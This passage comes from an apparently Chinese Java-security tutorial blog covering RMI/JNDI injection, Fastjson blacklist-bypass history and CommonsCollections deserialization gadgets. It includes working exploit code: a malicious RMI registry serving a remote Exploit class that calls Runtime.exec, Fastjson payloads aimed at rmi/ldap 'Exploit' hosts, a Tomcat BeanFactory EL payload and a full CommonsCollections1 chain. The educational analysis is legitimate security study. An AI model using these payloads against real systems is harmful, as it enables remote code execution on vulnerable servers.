RMI就是通过T3协议传输的（可以理解为序列化的数据载体是T3），它有如下特点：\n\n1. 服务端可以持续追踪监控客户端是否存活（心跳机制），通常心跳的间隔为60秒，服务端在超过240秒未收到心跳即判定与客户端的连接丢失。\n2. 通过建立一次连接可以将全部数据包传输完成，优化了数据包大小和网络消耗。\n\n上面说了JAVA RMI是使用JRMP的协议进行传输，**协议的不同就是他们最大的差别。**\n\n# RMI的攻击一般流程\n\n1. 服务端打开了RMI Registry端口（默认1099）\n2. 创建恶意客户端代码，连接RMI Registry，获取远程恶意对象，并调用恶意对象，执行恶意操作\n\n备注：\n\n- 执行的恶意操作是在服务端执行的，因为RMI就是为了在客户端一样方便的执行远程服务端。并且如果执行的是客户端的恶意操作，那本就不是漏洞\n- 远程恶意对象，是服务器刚好存在，并且我们知道。\n- 通常RMI Registry和服务端在同一服务器且处于同一JVM下，所以可以利用服务器的组件CommonsCollections来构造gadget，构造方法就是前面文章介绍的反序列gadget构造方法。\n\n# RMI小结\n\n1. RMI标准实现是Java RMI，其他实现还有Weblogic RMI、Spring RMI等。\n2. RMI的调用是基于序列化的，**一个对象远程传输需要序列化**，需要使用到这个对象就需要从序列化的数据中恢复这个对象，恢复这个对象时对应的readObject、readExternal等方法会被自动调用。\n3. RMI可以利用服务器本地反序列化利用链进行攻击。\n4. RMI具有动态加载类的能力以及能利用这种能力进行恶意利用。这种利用方式是在本地不存在可用的利用链或者可用的利用链中某些类被过滤了导致无法利用时可以使用，不过利用条件有些苛刻。\n5. 讲了Weblogic RMI和Java RMI的区别，以及Java RMI默认使用的专有传输协议（或者也可以叫做默认协议）是JRMP，Weblogic RMI默认使用的传输协议是T3。\n6. Weblogic RMI正常调用触发反序列化以及模拟T3协议触发反序列化都可以，但是模拟T3协议传输简化了很多过程。\n\n# JNDI的使用\n\nJNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置。\n\n前面说了JNDI类似于url，rmi类似于http，所以JNDI还可以使用除rmi之外的协议，例如LDAP、CORBA等。\n\n##JNDI与RMI配合使用\n\n```java\nHashtable env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY,\n        \"com.sun.jndi.rmi.registry.RegistryContextFactory\");\nenv.put(Context.PROVIDER_URL,\n        \"rmi://localhost:9999\");\nContext ctx = new InitialContext(env);\n\n//将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定\nctx.bind(\"refObj\", new RefObject());\n\n//通过名称查找对象\nctx.lookup(\"refObj\");\n```\n\n## JNDI与LDAP配合使用\n\n```java\nHashtable env = new Hashtable();\nenv.put(Context.INITIAL_CONTEXT_FACTORY,\n \"com.sun.jndi.ldap.LdapCtxFactory\");\nenv.put(Context.PROVIDER_URL, \"ldap://localhost:1389\");\n\nDirContext ctx = new InitialDirContext(env);\n\n//通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了\nObject local_obj = ctx.lookup(\"cn=foo,dc=test,dc=org\");\n```\n\n# JNDI动态协议转换\n\n上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER_URL，但是JNDI是能够进行动态协议转换的。\n\n例如：\n\n```java\nContext ctx = new InitialContext();\nctx.lookup(\"rmi://attacker-server/refObj\");\n//ctx.lookup(\"ldap://attacker-server/cn=bar,dc=test,dc=org\");\n//ctx.lookup(\"iiop://attacker-server/bar\");\n```\n\n上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据**传递的URL协议**自动转换与设置了对应的工厂与PROVIDER_URL（即使服务端提前设置了工厂与PROVIDER_URL）。\n\n在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：\n\n```java\npublic Object lookup(String name) throws NamingException {\n    return getURLOrDefaultInitCtx(name).lookup(name);\n}\n\nprotected Context getURLOrDefaultInitCtx(String name) \nthrows NamingException {\nif (NamingManager.hasInitialContextFactoryBuilder()) {//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入\n    return getDefaultInitCtx();\n}\nString scheme = getURLScheme(name);//尝试从名称解析URL中的协议\nif (scheme != null) {\n    Context ctx = NamingManager.getURLContext(scheme, myProps);//如果解析出了Schema协议，则尝试获取其对应的上下文环境\n    if (ctx != null) {\n   return ctx;\n    }\n}\nreturn getDefaultInitCtx();\n   }\n```\n\n# JNDI漏洞原理\n\nJNDI接口在初始化时，可以将RMI URL作为参数传入，而JNDI注入就出现在客户端的lookup()函数中，如果lookup()的参数可控就可能被攻击。\n\n备注：\n\n- InitialContext 是一个实现了 Context接口的类。使用这个类作为JNDI命名服务的入口点。创建InitialContext 对象需要传入一组属性，参数类型为java.util.Hashtable或其子类之一。\n- 需要重点注意的是，JNDI注入恶意的RMI服务器是攻击者在本地可控，**被攻击的服务器看成是发起lookup请求的客户端。**\n\n上一章节讲了RMI的漏洞利用，恶意代码是在RMI服务端执行的。所以为什么目标服务器lookup(RMI客户端)一个恶意的RMI服务地址，恶意代码会在目标服务器（RMI客户端）执行呢？\n\n## 利用JNDI References进行注入\n\n在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以**通过References类来绑定一个外部的远程对象**（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。\n\n使用工厂的话，因为为了构造对象，需要先从远程获取工厂类，**并在目标系统中工厂类被加载**。\n\n**整个利用流程如下：**\n\n1. 目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控；\n2. 攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name；\n3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；\n4. 目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例。\n\n## 攻击向量\n\n攻击者的服务端需要启动一个RMI Registry，并且绑定一个Reference远程对象，同时设置一个恶意的factory类。\n\n```java\n    Registry registry = LocateRegistry.createRegistry(1099);\n    String remote_class_server = \"http://192.168.1.200:8080/\";\n    Reference reference = new Reference(\"Exploit\", \"Exploit\", remote_class_server);\n    //reference的factory class参数指向了一个外部Web服务的地址\n    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);\n    registry.bind(\"xxx\", referenceWrapper);\n```\n\n同时启动一个WebServer提供Exploit.class下载。恶意代码可以放在构造方法中，也可以放在getObjectInstance(）方法中：\n\n```java\npublic class Exploit implements ObjectFactory {\n\n    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {\n        exec(\"xterm\");\n        return null;\n    }\n\n    public static String exec(String cmd) {\n        try {\n            String sb = \"\";\n            BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());\n            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));\n            String lineStr;\n            while ((lineStr = inBr.readLine()) != null)\n                sb += lineStr + \"\\n\";\n            inBr.close();\n            in.close();\n            return sb;\n        } catch (Exception e) {\n            return \"\";\n        }\n    }\n}\n```\n\n**参考：**\n\nhttps://www.anquanke.com/post/id/194384#h3-2\n\nhttps://www.jianshu.com/p/5c6f2b6d458a\n\nhttps://www.freebuf.com/column/189835.html","tags":["JDNI","RMI","反序列化"],"categories":["JAVA安全教程"]},{"title":"Fastjson历史漏洞绕过分析","url":"/2019/02/18/Fastjson历史漏洞绕过分析/","content":"\n# 前言\n\n本文转载自https://www.anquanke.com/post/id/182140#h2-1, 这里也非常好的总结了fastjson历史的绕过漏洞，基本上就是对checkAutoType函数的绕过。\n\npom文件引用fastjson语法：\n\n```xml\n<!-- https://mvnrepository.com/artifact/com.alibaba/fastjson -->\n<dependency>\n    <groupId>com.alibaba</groupId>\n    <artifactId>fastjson</artifactId>\n    <version>1.2.41</version>\n</dependency>\n```\n\n使用样例：\n\n```java\nimport com.alibaba.fastjson.JSON;\n \npublic class newPoc {\n    public static void main(String[] argv) {\n        String payload = \"{\\\"name\\\":{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"},\\\"x\\\":{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1/Exploit\\\",\\\"autoCommit\\\":true}}\";\n        JSON.parse(payload);\n    }\n}\n```\n\n\n\n#Fastjson RCE关键函数\n\n**DefaultJSONParser. parseObject()** 解析传入的json字符串提取不同的key进行后续的处理\n\n**TypeUtils. loadClass()**  根据传入的类名，生成类的实例\n\n**JavaBeanDeserializer. Deserialze()** 依次调用@type中传入类的对象公有set\\get\\is方法。\n\n**ParserConfig. checkAutoType()** 阿里后续添加的防护函数，用于在loadclass前检查传入的类是否合法。\n\n # 历史fastjson漏洞汇总与简析\n\n## fastjson RCE漏洞的源头\n\n首先来看一次fastjson反序列化漏洞的poc\n\n```java\n{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\" \"autoCommit\":true}\n```\n\n先看调用栈\n\n```\nExec:620, Runtime  //命令执行\n\n…\n\nLookup:417, InitalContext   /jndi lookup函数通过rmi或者ldap获取恶意类\n\n…\n\nsetAutoCommit:4067, JdbcRowSetImpl 通过setAutoCommit从而在后面触发了lookup函数\n\n…\n\nsetValue:96, FieldDeserializer //反射调用传入类的set函数\n\n…\n\ndeserialze:600,  JavaBeanDeserializer 通过循环调用传入类的共有set,get,is函数\n\n…\n\nparseObject:368, DefaultJSONParser 解析传入的json字符串\n\n…\n```\n\n第一版的利用原理比较清晰，因为fastjson在处理以**@type形式传入的类的时候，会默认调用该类的共有set\\get\\is函数**，因此我们在寻找利用类的时候思路如下：\n\n1. 类的成员变量我们可以控制\n2. 想办法在调用类的某个set\\get\\is函数的时候造成命令执行\n\n于是便找到了JdbcRowSetImpl类，该类在setAutoCommit函数中会对成员变量dataSourceName进行lookup，完美的jndi注入利用。\n\n关于jndi注入的利用方式我在这里简单提一下，因为jndi注入的利用受jdk版本影响较大，所以在利用的时候还是要多尝试的。\n\n注：利用之前当然要先确定一下漏洞是否存在，通过dnslog是个比较好用的法子。\n\n**基于rmi的利用方式：**\n\n**适用jdk版本：**JDK 6u132, JDK 7u122, JDK 8u113之前\n\n利用方式：\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.RMIRefServer\n\nhttp://127.0.0.1:8080/test/#Expolit\n```\n\n **基于ldap的利用方式：**\n\n**适用jdk版本：**JDK 11.0.1、8u191、7u201、6u211之前\n\n利用方式：\n\n```\njava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.LDAPRefServer\n\nhttp://127.0.0.1:8080/test/#Expolit\n```\n\n**基于BeanFactory的利用方式：**\n\n**适用jdk版本：**JDK 11.0.1、8u191、7u201、6u211以后\n\n利用前提：因为这个利用方式需要借助服务器本地的类，而这个类在tomcat的jar包里面，一般情况下只能在tomcat上可以利用成功。\n\n利用方式：\n\n```java\npublic class EvilRMIServerNew {\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"Creating evil RMI registry on port 1097\");\n        Registry registry = LocateRegistry.createRegistry(1097);\n\n        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory\n        ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null);\n\n        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code\n        ref.add(new StringRefAddr(\"forceString\", \"x=eval\"));\n\n        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows\n        ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app/']).start()\\\")\"));\n        \n        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);\n\n        registry.bind(\"Object\", referenceWrapper);\n    }\n}\n```\n\n## fastjson RCE漏洞的历次修复与绕过\n\nfastjson在曝出第一版的RCE漏洞之后，官方立马做了更新，于是就迎来了一个新的主角，checkAutoType()，**在接下来的一系列绕过中都是和这个函数的斗智斗勇**。\n\n先看一下这个函数的代码\n\n```java\npublic Class<?> checkAutoType(String typeName, Class<?> expectClass, int features) {\n    if (typeName == null) {\n        return null;\n    } else if (typeName.length() >= 128) {\n        throw new JSONException(\"autoType is not support. \" + typeName);\n    } else {\n        String className = typeName.replace('$', '.');\n        Class<?> clazz = null;\n        int mask;\n        String accept;\n        if (this.autoTypeSupport || expectClass != null) {\n            for(mask = 0; mask < this.acceptList.length; ++mask) {\n                accept = this.acceptList[mask];\n                if (className.startsWith(accept)) {\n                    clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);\n                    if (clazz != null) {\n                        return clazz;\n                    }\n                }\n            }\n\n            for(mask = 0; mask < this.denyList.length; ++mask) {\n                accept = this.denyList[mask];\n                if (className.startsWith(accept) && TypeUtils.getClassFromMapping(typeName) == null) {\n                    throw new JSONException(\"autoType is not support. \" + typeName);\n                }\n            }\n        }\n```\n\n防御的方式比较清晰，限制长度+黑名单，这个时候第一时间产生的想法自然是绕过黑名单，先看一下第一版的黑名单：\n\n```java\nthis.denyList = \"bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.apache.xalan,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework\".split(\",\");\n```\n\n其实第一版的黑名单还是挺强大的，关于黑名单的绕过，就我已知的目前只有一个依赖于ibatis的payload，当然因为ibatis在java里面的使用还是非常广泛的，所以这个payload危害也是比较大的，这也就是1.2.45的绕过。\n\n```json\n{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"rmi://localhost:1099/Exploit\"}}\n```\n\n绕过黑名单是第一种思路，但是安全界大牛们思路还是比较灵活的，很快又发现了第二种思路，我们再仔细看一下checkAutoType函数的下面这几行代码：\n\n```java\nf (!this.autoTypeSupport) {\n    for(mask = 0; mask < this.denyList.length; ++mask) {\n        accept = this.denyList[mask];\n        if (className.startsWith(accept)) {\n            throw new JSONException(\"autoType is not support. \" + typeName);\n        }\n    }\n\n    for(mask = 0; mask < this.acceptList.length; ++mask) {\n        accept = this.acceptList[mask];\n        if (className.startsWith(accept)) {\n            if (clazz == null) {\n                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);\n            }\n```\n\n该函数是先检查传入的@type的值是否是在黑名单里，然后再进入loadClass函数，这样的话如果loadClass函数里要是会对传入的class做一些处理的话，我们是不是就能绕过黑名单呢，跟进loadClass函数，\n\n```java\npublic static Class<?> loadClass(String className, ClassLoader classLoader, boolean cache) {\n    if (className != null && className.length() != 0) {\n        Class<?> clazz = (Class)mappings.get(className);\n        if (clazz != null) {\n            return clazz;\n        } else if (className.charAt(0) == '[') {\n            Class<?> componentType = loadClass(className.substring(1), classLoader);\n            return Array.newInstance(componentType, 0).getClass();\n        } else if (className.startsWith(\"L\") && className.endsWith(\";\")) {\n            String newClassName = className.substring(1, className.length() - 1);\n            return loadClass(newClassName, classLoader);\n```\n\n可以看到当传入的className以L开头以 ; 结尾的时候会把className的首字符和最后一个字符截去，再去生成实例，于是绕过的poc就非常好写了，原来的payload的利用类的首尾加上这两个字符就Ok了\n\n```json\n{\"@type\":\"Lcom.sun.rowset.RowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}\n```\n\n之后的42、43版本的绕过和41的原理是一样的我们就不再提了，具体可以去https://github.com/shengqi158/fastjson-remote-code-execute-poc/自行查阅。\n\n## 最新fastjson RCE的分析\n\nOK，现在来到了我们期待已久的最新的fastjson漏洞的分析，关于这个漏洞有很精彩的小故事可以讲一讲。\n\n这个漏洞在曝光之后poc迟迟未见，关于它能够被利用成功的版本也可谓是每日都有更新，关于版本有几个关键字 “51”、“48”，“58”，究竟是哪个让人摸不到头脑，于是乎，决定先去看看官方的公告，发现只有49版本releases的公告里面写了“增强安全防护”，于是乎决定去48、49版本寻觅一下，看看commit之类的，但是当时也没有发现什么。\n\n这个时候，一个名不愿透露姓名的大佬在某个技术群里面默默发了一个关键字“testcase“，当时忽然间产生了一丝电流，难道阿里的大佬们在修漏洞的时候会在testcase里面做测试，然后还把testcase的代码传到git里面了？但是还不够，因为testcase的代码太多了究竟放在哪里呢，这个时候之前的分析就可以知道，阿里在防护第一版RCE的时候是通过autotypecheck函数，那这次的补丁也很有可能和它相关喽，直接在testcase里面全局寻找带有autotype关键字的文件名，于是乎，就到达了如下位置\n\n![img](/images/a8/1.png)\n\n依次去看一下里面的文件，基本都是和反序列化漏洞相关的test，其中AutoTypeTest4.java文件中有如下代码：\n\n```java\n       String payload=\"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"}\";\n \t\n        String payload_2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:8889/xxx\\\",\\\"autoCommit\\\":true}\";\n \t\n        assertNotNull(\"class deser is not null\", config.getDeserializer(Class.class));\n        int size = mappings.size();\n        final int COUNT = 10;\n        for (int i = 0; i < COUNT; ++i){\n            JSON.parse(payload, config);\n        }\n\n        for (int i = 0; i < COUNT; ++i){ \t\n            Throwable error2 = null;\n            try {\n                JSON.parseObject(payload_2);\n            } catch (Exception e) {\n                error2 = e;\n            }\n            assertNotNull(error2); \t\n            assertEquals(JSONException.class, error2.getClass());\n        }\n        assertEquals(size, mappings.size());\n    }\n```\n\n看上去和以往的payload都不太一样，先去写一个简化版的代码，调试一下\n\n```java\nString payload=\"{\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"}\";\n\nString payload_2 = \"{\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/Exploit\\\",\\\"autoCommit\\\":true}\";\n\nJSON.parse(payload);\nJSON.parse(payload_2);\n```\n\n发现可以弹框成功（从49版本往前，一个版本一个版本试验，到47版本试验成功了），那这就很可疑了，但是还有个问题，漏洞要利用总不能让你同时穿进去两个json字符串让你依次parse吧，于是把两串json整理如下\n\n```json\n{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\",\"autoCommit\":true}}}\n```\n\n果然可以利用成功，、接下来可以调试一下看看漏洞成因，因为一眼就能看出来是绕过了黑名单，所以问题的关键自然在checkAutoType()和loadClass()这两个函数中，去跟进一下\n\n首先在”a”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”}传入的时候，Class类是不在黑名单内的，在MiscCodec类的deserialze函数里面可以看到会将val的值拿出来用来生成对应的对象，即JdbcRowSetImpl，但是我们并没法给JdbcRowSetImpl对象的成员变量赋值，\n\n![img](/images/a8/2.png)\n\n继续往deserialze的下面看，当传入的@type的值为Class的时候会调用loadClass函数，\n\n![img](/images/a8/3.png)\n\n再往下跟，有调了一下loadClass函数，多加了一个值为true的参数\n\n![img](/images/a8/4.png)\n\n再跟进去可以看到因为传入的cache为true，所以会在mapping里面把JdbcRowSetImpl这个对象的实例和com.sun.rowset.JdbcRowSetImpl对应起来，OK现在关于a的分析到此为止，\n\n![img](/images/a8/5.png)\n\n我们该去跟着b\n\n```json\n（”b”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://localhost:1389/Exploit”,”autoCommit”:true}}）\n```\n\n了，看看为什么checkautotype()函数没把b给拦下来，直接去跟进checkautotype函数，当autotype为true的时候，虽然发现黑名单匹配了，但是TypeUtils.getClassFromMapping(typeName) ！= null所以不会抛出异常。\n\n![img](/images/a8/6.png)\n\n而当autotype为false的时候，发现当传入的@type对应的类在mapping里面有的时候，就直接把之前生成的对象拉出来了，这时候直接返回，压根还没有走到后面的黑名单，所以成功绕过了之前的补丁。可以看到这次的poc是不受autotype影响的，\n\n![img](/images/a8/7.png)\n\n从上面的分析也可以明白后续官方的补丁做了什么，那自然是把cache的默认值改成了false，不让Class生成的对象存在mapping里面了。\n\n**备注：**\n\n最新的RCE漏洞https://xz.aliyun.com/t/5680这里讲的更清楚。原理：\n\n当发送第一次请求时，Class是通过deserializers.findClass加载的，然后Class将JdbcRowSetImpl类加载进map中，然后第二次请求时，就这里就成功找到了JdbcRowSetImpl类，从而绕过检测。\n\n# Fastjson漏洞挖掘的规律总结\n\n从上面追溯的fastjson的修复绕过上面可以看到有以下几点还是很值得注意的：\n\n1. fastjson的防范类是checkAutoType函数，而导致命令执行的很关键的一步是loadClass，因此从checkAutoType到loadClass之间的代码，将会是绕过需要研究的关键部分。\n2. 如果需要绕过黑名单，需要将目光放到使用量较大，并提供jndi功能的jar包上。\n3. 对于这种早就修复但是还没有公开的漏洞，github的源码中说不定有惊喜。\n\n\n\n**参考：**\n\nhttps://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA\n\nhttps://github.com/shengqi158/fastjson-remote-code-execute-poc/\n\nhttps://github.com/mbechler/marshalsec","tags":["反序列化","Fastjson"],"categories":["JAVA安全教程"]},{"title":"CommonsCollections反序列化gadget构造","url":"/2019/02/16/CommonsCollections反序列化gadget构造/","content":"\n# 前言\n\n文章 https://www.freebuf.com/articles/web/214096.html 已经把几种利用方式总结的很好了，没必要再重复造轮子，就转载过来。里面的代码大家最好自己idea里调试一遍，有助于理解。文章中最后的总结是构造payload的精华总结，希望大家能好好看下总结和理解。\n\n# Apache Commons Collections 简介\n\nApache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。\n\nCommonsCollections造成RCE的根本原因就在于我们**构造了一个特殊的ChainedTransformer类的对象，这样当我们调用这个对象的transform函数的时候，就会造成命令执行**，于是，我们需要做的事情就是去寻找某个类，把包含恶意代码的transformerChain放到这个类里面，当对这个类的对象进行反序列化的时候会调用transformerChain的transform函数\n\n下面的payload构造都是参考自[ysoserial](https://github.com/frohoff/ysoserial)。这个工具用来生成各种反序列攻击向量，本文介绍的是常用的CommonmonsCollections库的构造方法，除此之外，还有很多反序列化的构造方法，大家可以去看源码好好研究下。\n\n#CommonsCollections1\n\n**适用版本**：3.1-3.2.1，jdk1.8以前\n\n这边先上CommonsCollections1的代码，为了便于阅读，这些代码都是我从ysoserial里面抽离并简化了的，关键的部分已经给上了注释，\n\n```java\nimport java.io.*;\nimport java.lang.reflect.*;\nimport java.util.HashMap;\nimport java.util.Map;\nimport com.nqzero.permit.Permit;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport static sun.reflect.misc.FieldUtil.getField;\npublic class CommonsCollectionPayload {\n    static String ANN_INV_HANDLER_CLASS = \"sun.reflect.annotation.AnnotationInvocationHandler\";\n    //getInvocationHandler用于获取名为handler的InvocationHandler实例，并将map传入成员变量memberValues\n    public static InvocationHandler getInvocationHandler(String handler, Map<String, Object> map) throws Exception {\n        //获取构造函数\n        final Constructor<?> ctor = Class.forName(handler).getDeclaredConstructors()[0];\n        //获取handler的私有成员的访问权限，否则会报 can not access a member of class sun.reflect.annotation.AnnotationInvocationHandler\n        Permit.setAccessible(ctor);\n        //实例化\n        return (InvocationHandler) ctor.newInstance(Override.class, map);\n    }\n    //createMyproxy用于返回handler为ih，代理接口为iface的动态代理对象\n    public static <T> T createMyproxy(InvocationHandler ih, Class<T> iface) {\n        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, 1);\n        allIfaces[0] = iface;\n        return iface.cast(Proxy.newProxyInstance(CommonsCollectionPayload.class.getClassLoader(), allIfaces, ih));\n    }\n    //setFieldValue用于设置obj对象的成员变量fieldName的值为value\n    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {\n        Field field = null;\n        try {\n            //获取私有成员变量\n            field = obj.getClass().getDeclaredField(fieldName);\n            //获取私有成员变量访问权限\n            Permit.setAccessible(field);\n        }\n        catch (NoSuchFieldException ex) {\n            if (obj.getClass().getSuperclass() != null)\n                field = getField(obj.getClass().getSuperclass(), fieldName);\n        }\n        field.set(obj, value);\n    }\n    public static void main(String[] args) throws Exception {\n        String[] execArgs = new String[]{\"open /Applications/Calculator.app/\"};\n        // inert chain for setup\n        Transformer transformerChain = new ChainedTransformer(\n                new Transformer[]{new ConstantTransformer(1)});\n        // real chain for after setup\n        Transformer[] transformers = new Transformer[]{\n                new ConstantTransformer(Runtime.class),\n                new InvokerTransformer(\"getMethod\", new Class[]{\n                        String.class, Class[].class}, new Object[]{\n                        \"getRuntime\", new Class[0]}),\n                new InvokerTransformer(\"invoke\", new Class[]{\n                        Object.class, Object[].class}, new Object[]{\n                        null, new Object[0]}),\n                new InvokerTransformer(\"exec\",\n                        new Class[]{String.class}, execArgs),\n                new ConstantTransformer(1)};\n        //下面这部分为RCE的关键部分代码\n        Map innerMap = new HashMap();\n        //生成一个lazyMap对象，并将transformerChain赋值给对象的factory成员变量\n        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);\n        //创建一个Map接口的代理，并且为这个代理设置一个memberValues为lazyMap的AnnotationInvocationHandler\n        Map mapProxy = (Map) createMyproxy(getInvocationHandler(ANN_INV_HANDLER_CLASS, lazyMap), Map.class);\n        //创建一个memberValues为mapProxy的AnnotationInvocationHandler对象，这个对象也就是我们反序列化利用的恶意对象\n        InvocationHandler handler = getInvocationHandler(ANN_INV_HANDLER_CLASS, mapProxy);\n        //通过反射的方式进行赋值，即使赋值在生成对象之后也没有关系\n        setFieldValue(transformerChain, \"iTransformers\", transformers);\n        //将恶意对象存储为字节码\n        FileOutputStream fos = new FileOutputStream(\"payload.ser\");\n        ObjectOutputStream oos = new ObjectOutputStream(fos);\n        oos.writeObject(handler);\n        oos.flush();\n        oos.close();\n        //读取恶意对象字节码并进行反序列化操作\n        FileInputStream fis = new FileInputStream(\"payload.ser\");\n        ObjectInputStream ois = new ObjectInputStream(fis);\n        Object evilObject = ois.readObject();\n        ois.close();\n    }\n}\n```\n\n看一下关键部分的调用栈，\n\n![img1.png](/images/a7/1.png)\n\n当对恶意对象AnnotationInvocationHandler进行反序列化的时候，调用readObject方法，并对成员变量memberValues调用entrySet方法，\n\n![img2.png](/images/a7/2.png)\n\n由于memberValues是一个代理对象，所以回去调用该对象对应handler的invoke方法，一定要注意，这个时候的handler就是memberValues为lazyMap的handler了\n\n![img3.png](/images/a7/3.png)\n\n由于entrySet匹配不到if语句中的判断，走到else，，从而调用this.memberValues.get(var4)，于是到达了lazyMap.get()了\n\n![img4.png](/images/a7/4.png)\n\n我们代码注释里已经说过了，lazyMap的factory变量就是我们的恶意对象transformerChain，并且调用了他的transform方法，成功造成命令执行。\n\n我们去看一下3.2.2版本的时候这个漏洞是如何修复的\n\n```\n    private void writeObject(ObjectOutputStream os) throws IOException {\n        FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(\"org.apache.commons.collections.functors.InvokerTransformer\")) : class$org$apache$commons$collections$functors$InvokerTransformer);\n        os.defaultWriteObject();\n    }\n    private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {\n        FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(\"org.apache.commons.collections.functors.InvokerTransformer\")) : class$org$apache$commons$collections$functors$InvokerTransformer);\n        is.defaultReadObject();\n    }\n```\n\n就是在调用readObject和writeObject的时候把InvokerTransformer类给拉黑了。（当然这个还是需要看一下系统的配置org.apache.commons.collections.enableUnsafeSerialization的值的，不过这个值默认是false）\n\n# CommonsCollections2\n\n**适用版本**：commons-collections-4.0, jdk7u21及以前其实这个CommonsCollections2只能叫另一种利用方式，而不能叫做CommonsCollections1的绕过，因为CommonsCollections1也是可以在commons-collections-4.0利用成功的，但是因为commons-collections-4.0删除了lazyMap的decode方法，所以需要将代码中的\n\n```java\nMap lazyMap = LazyMap.decorate(innerMap, transformerChain);\n```\n\n修改为\n\n```java\nMap lazyMap = LazyMap.lazyMap(innerMap,transformerChain);\n```\n\n而且，更重要的一点，CommonsCollections2不能在3.1-3.2.1版本利用成功，**根本原因在于CommonsCollections2的payload中使用的TransformingComparator在3.1-3.2.1版本中还没有实现Serializable接口，无法被反序列化。**\n\n现在我们来看一下CommonsCollections2的payload\n\n```java\nimport com.nqzero.permit.Permit;\nimport 